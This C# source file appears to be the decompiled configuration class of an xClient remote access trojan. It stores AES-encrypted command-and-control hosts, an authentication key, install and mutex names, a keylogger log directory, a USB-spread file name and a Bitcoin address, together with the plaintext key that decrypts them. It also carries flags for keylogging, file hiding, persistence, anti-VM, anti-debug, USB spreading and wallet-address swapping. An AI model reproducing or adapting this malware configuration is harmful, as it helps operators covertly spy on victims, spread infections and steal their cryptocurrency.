using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "HVryw7Htjfto8kdvmoV4YoJAUm/dmdZi8RZd+l5hbOSBDpIDd62NK4U7rQ915Do1GAdT9bhkk5KEbIzfnz4z0Q==";

	public static string HOSTS = "7qSL8Kw4jr9QCoCO3YXjTOEeTu++4fkb/fBCvz8mTFGA7Vr7P1/ik8UuZsyyoOc6A2cSYbHxcUKFT3pspjeMmlZId5tGuAJhXTfrcgUp2IQ=";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "1WvgEMPjdwfqIMeM9MclyQ==";

	public static string AUTHKEY = "NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "xCDd8H7CWBTMsoCd5oMWyZbOfIG1a5m+2CoMfNv7Gfbkei5wDUasEczOyFSaKm83VVGzvRHvA2yBtD5Y23EWCw==";

	public static string INSTALLNAME = "8hRnV0dzDnQlJ2mkUxFg1yhJe9n/gbYVKBdZz8iPPuQAhf27fTUjUQBXo0yt64ywlwadpJbgn6bsyhIyJKJRuQ==";

	public static bool INSTALL = false;

	public static bool STARTUP = false;

	public static string MUTEX = "ihaXrLsDZFdwzmgr8EEDcLSdHx2tcSt9s8/RkLW9mNjAQMOV43OZ1emtW584hXRZYl4nZmodNxfINOAi6XNagrvPEGMctjx9nhroXd/JCVI=";

	public static string STARTUPKEY = "x3HLA3d4LQtytax+5ct5qk+dhmd7TpHpAxWSWbMxpCKB3umcgBoU7x78GSr3m9UQOHSmqL7j7LX1HCsMqR8xLw==";

	public static bool HIDEFILE = true;

	public static bool ENABLELOGGER = true;

	public static string ENCRYPTIONKEY = "krp9hA6k4aiAy9dYU27c";

	public static string TAG = "27/Tdr1dBdIUGDvnmfn2CqU0+NUATnqcxsOb+qbWredrC3niK7zo+eL3oMY8QRDBKG7Pn1ANsrKcm18bQl344Q==";

	public static string LOGDIRECTORYNAME = "VMWo9OUDTWwW641OTrH9ligIIwbZEKTtqpGcXYyi7gItGLHZ88lW0lt6YMD37+pHFgb2QrzkzaEjYfiKNxkyfQ==";

	public static string USBSpreadNAME = "pUVatiYH2l0Zj1vi2jWrqYo/UiIYcnp4DS/UWOjwczuN7m0quaF0hiuSmWZFYejsGNMGmHbuufL97VlBCSujPw==";

	public static string BTCAddress = "GP6zn/HhFs2cz4fUN9R14/qg5kfFSKZipqf1uBek53A5XcRitu1IlsUYmcmvfPcX2QWiTzPd+cQOvhYe0YKIqQ==";

	public static bool HIDELOGDIRECTORY = true;

	public static bool HIDEINSTALLSUBDIRECTORY = true;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = false;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
